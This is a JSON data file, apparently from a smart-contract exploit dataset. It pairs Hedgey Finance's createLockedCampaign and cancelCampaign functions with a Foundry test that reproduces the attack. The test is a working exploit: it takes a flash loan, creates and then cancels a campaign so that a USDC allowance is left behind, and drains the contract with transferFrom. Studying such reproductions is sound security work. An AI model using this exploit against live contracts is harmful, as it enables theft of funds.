@@ -1,0 +1,114 @@
+[
+  {
+    "contract/interface": "IClaimCampaigns",
+    "source_type": "victim_contract",
+    "function_name": "cancelCampaign",
+    "original_code": "  function cancelCampaign(bytes16 campaignId) external nonReentrant {\n    Campaign memory campaign = campaigns[campaignId];\n    require(campaign.manager == msg.sender, '!manager');\n    delete campaigns[campaignId];\n    delete claimLockups[campaignId];\n    TransferHelper.withdrawTokens(campaign.token, msg.sender, campaign.amount);\n    emit CampaignCancelled(campaignId);\n  }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IClaimCampaigns",
+    "source_type": "victim_contract",
+    "function_name": "createLockedCampaign",
+    "original_code": "  function createLockedCampaign(\n    bytes16 id,\n    Campaign memory campaign,\n    ClaimLockup memory claimLockup,\n    Donation memory donation\n  ) external nonReentrant {\n    require(!usedIds[id], 'in use');\n    usedIds[id] = true;\n    require(campaign.token != address(0), '0_address');\n    require(campaign.manager != address(0), '0_manager');\n    require(campaign.amount > 0, '0_amount');\n    require(campaign.end > block.timestamp, 'end error');\n    require(campaign.tokenLockup != TokenLockup.Unlocked, '!locked');\n    require(claimLockup.tokenLocker != address(0), 'invalide locker');\n    TransferHelper.transferTokens(campaign.token, msg.sender, address(this), campaign.amount + donation.amount);\n    if (donation.amount > 0) {\n      if (donation.start > 0) {\n        SafeERC20.safeIncreaseAllowance(IERC20(campaign.token), donation.tokenLocker, donation.amount);\n        ILockupPlans(donation.tokenLocker).createPlan(\n          donationCollector,\n          campaign.token,\n          donation.amount,\n          donation.start,\n          donation.cliff,\n          donation.rate,\n          donation.period\n        );\n      } else {\n        TransferHelper.withdrawTokens(campaign.token, donationCollector, donation.amount);\n      }\n      emit TokensDonated(id, donationCollector, campaign.token, donation.amount, donation.tokenLocker);\n    }\n    claimLockups[id] = claimLockup;\n    SafeERC20.safeIncreaseAllowance(IERC20(campaign.token), claimLockup.tokenLocker, campaign.amount);\n    campaigns[id] = campaign;\n    emit ClaimLockupCreated(id, claimLockup);\n    emit CampaignStarted(id, campaign);\n  }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "HedgeyFinance",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "HedgeyFinance",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "HedgeyFinance",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "HedgeyFinance",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "HedgeyFinance",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "HedgeyFinance",
+    "source_type": "attacker_contract",
+    "function_name": "receiveFlashLoan",
+    "original_code": "    function receiveFlashLoan(\n        address[] memory,\n        uint256[] memory amounts,\n        uint256[] memory fees,\n        bytes memory\n    ) external payable {\n        // Start new campage\n        USDC.approve(address(HedgeyFinance), loan);\n\n        // Id\n        bytes16 campaign_id = 0x00000000000000000000000000000001;\n\n        Campaign memory campaign;\n        campaign.manager = address(this);\n        campaign.token = address(USDC);\n        campaign.amount = loan;\n        campaign.end = 3_133_666_800;\n        campaign.tokenLockup = TokenLockup.Locked;\n        campaign.root = \"\"; // 0x0000000000000000000000000000000000000000000000000000000000000000\n\n        ClaimLockup memory claimLockup;\n        claimLockup.tokenLocker = address(this);\n        claimLockup.start = 0;\n        claimLockup.cliff = 0;\n        claimLockup.period = 0;\n        claimLockup.periods = 0;\n\n        Donation memory donation;\n        donation.tokenLocker = address(this);\n        donation.amount = 0;\n        donation.rate = 0;\n        donation.start = 0;\n        donation.start = 0;\n        donation.cliff = 0;\n        donation.period = 0;\n\n        HedgeyFinance.createLockedCampaign(campaign_id, campaign, claimLockup, donation);\n\n        HedgeyFinance.cancelCampaign(campaign_id);\n\n        // pay back the FlashLoan\n        USDC.transfer(address(BalancerVault), loan);\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "HedgeyFinance",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", blocknumToForkFrom);\n\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(BalancerVault), \"BalancerVault\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "HedgeyFinance",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "HedgeyFinance",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "HedgeyFinance",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "HedgeyFinance",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "HedgeyFinance",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "HedgeyFinance",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "HedgeyFinance",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        deal(address(this), 0 ether);\n        emit log_named_decimal_uint(\"Attacker USDC balance before exploit\", address(this).balance, 18);\n\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(USDC);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = loan;\n\n        BalancerVault.flashLoan(address(this), tokens, amounts, \"\");\n\n        // At this point we have an Approval\n        uint256 HedgeyFinance_balance = USDC.balanceOf(address(HedgeyFinance));\n        USDC.transferFrom(address(HedgeyFinance), address(this), HedgeyFinance_balance);\n\n        emit log_named_decimal_uint(\n            \"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n    }\n\n",
+    "description": ""
+  }
+]
